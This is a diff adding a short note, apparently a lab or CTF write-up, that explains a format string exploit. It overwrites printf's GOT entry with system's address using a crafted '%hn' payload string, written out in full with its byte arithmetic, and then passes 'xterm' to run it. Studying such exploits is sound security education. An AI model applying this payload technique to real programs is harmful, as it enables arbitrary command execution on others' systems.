@@ -1,0 +1,25 @@
+The address 0x5bc300c corresponds to got table entry address for the printf
+the address 0xf7e41950 corresponds to system function address
+
+So we are setting the content of 0x5bc300c to  0xf7e41950 , by using format string vulnerabilty 
+
+for this we are writing 2 bytes 0x1950 starting from 0x05bc300c ,and 2 bytes 0xf7e4 starting from 0x05bc300e
+
+In decimal: 63460 corresponds to 0xf7e4
+In decimal: 6480  corresponds to 0x1950
+
+the below is the string that we are passing into printf
+
+"\x0c\x30\xbc\x05\x0e\x30\xbc\x05 %6470x %7$hn %56978x %8$hn"
+
+We found out that if the format string is like this then 
+7th argument will be 0x05bc300c
+8th argument will be 0x05bc300e
+
+and %a$hn will store the number of charcters that are printed till now in (2 bytes) at the ath argument
+
+so by this way we are changing the content of got table enty of printf to system in 1st iteration
+
+in 2nd iteration we are passing "xterm", so this string will be argument to this system function and we can open xterm by this.
+
+
